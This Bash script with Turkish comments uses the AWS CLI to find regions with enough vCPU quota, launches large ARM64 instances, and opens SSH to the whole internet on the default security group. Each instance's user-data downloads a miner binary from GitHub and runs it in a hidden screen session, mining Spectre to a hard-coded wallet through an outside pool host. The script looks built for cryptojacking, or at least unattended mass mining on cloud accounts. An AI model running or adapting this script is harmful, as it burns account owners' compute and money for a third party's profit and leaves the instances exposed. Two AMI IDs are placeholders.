#!/bin/bash

# On-demand instance türleri
declare -a instance_types=("m8g.16xlarge" "c8g.16xlarge" "r8g.16xlarge")

# Yeni bölgeler
declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# Her bölge için ARM64 destekli Ubuntu 24 AMI ID'leri
declare -A ami_ids
ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"
ami_ids["eu-north-1"]="ami-001e33773aec8d45f"
ami_ids["us-east-1"]="ami-0a7a4e87939439934"
ami_ids["us-west-2"]="ami-0acefc55c3a331fa8"
ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"

# Başarılı ve başarısız bölgeler için diziler
success_regions=()
failed_regions=()

# vCPU limit kontrol fonksiyonu
check_vcpu_limit() {
    local region=$1
    echo "Bölge $region için vCPU limiti kontrol ediliyor..."

    vcpu_limit=$(aws service-quotas get-service-quota \
        --region "$region" \
        --service-code ec2 \
        --quota-code L-1216C47A \
        --query "Quota.Value" --output text)

    vcpu_limit=$(printf "%.0f" "$vcpu_limit")

    if [ -z "$vcpu_limit" ]; then
        echo "vCPU limiti alınamadı. Bölge $region atlanıyor."
        return 1
    fi

    echo "vCPU Limit: $vcpu_limit"

    if (( vcpu_limit < 64 )); then
        echo "vCPU limiti yetersiz. Bölge $region atlanıyor."
        return 1
    fi

    return 0
}

# Uygun instance türü bulma fonksiyonu
find_instance_type() {
    local region=$1
    for instance_type in $(shuf -e "${instance_types[@]}"); do
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text)
        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

# On-demand instance talebi oluşturma fonksiyonu
create_on_demand_request() {
    local region=$1
    echo "Bölge: $region"

    instance_type=$(find_instance_type "$region")
    if [ -z "$instance_type" ]; then
        echo "$region bölgesinde uygun bir instance türü bulunamadı."
        failed_regions+=("$region")
        return
    fi
    echo "Seçilen instance türü: $instance_type"

    ami_id=${ami_ids[$region]}
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için AMI ID'si tanımlanmamış."
        failed_regions+=("$region")
        return
    fi

    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" --output text)

    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 2>/dev/null || true

    user_data=$(cat <<EOF
#!/bin/bash
sudo apt update -y
sudo apt install -y git screen
cd /root
git clone https://github.com/eraemm/efsaneyim.git
cd efsaneyim
chmod +x tnn-miner-arch
screen -dmS spectre ./tnn-miner-arch --spectre --daemon-address 144.91.120.111 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
EOF
    )

    instance_id=$(aws ec2 run-instances \
        --region "$region" \
        --image-id "$ami_id" \
        --instance-type "$instance_type" \
        --security-group-ids "$security_group_id" \
        --user-data "$user_data" \
        --count 1 \
        --query 'Instances[0].InstanceId' --output text)

    if [ -n "$instance_id" ]; then
        echo "Instance oluşturuldu: $instance_id"
        success_regions+=("$region:$instance_type")
    else
        echo "Instance oluşturulamadı."
        failed_regions+=("$region")
    fi
}

for region in "${regions[@]}"; do
    check_vcpu_limit "$region" || continue
    create_on_demand_request "$region"
done

echo "Başarılı bölgeler: ${success_regions[@]}"
echo "Başarısız bölgeler: ${failed_regions[@]}"
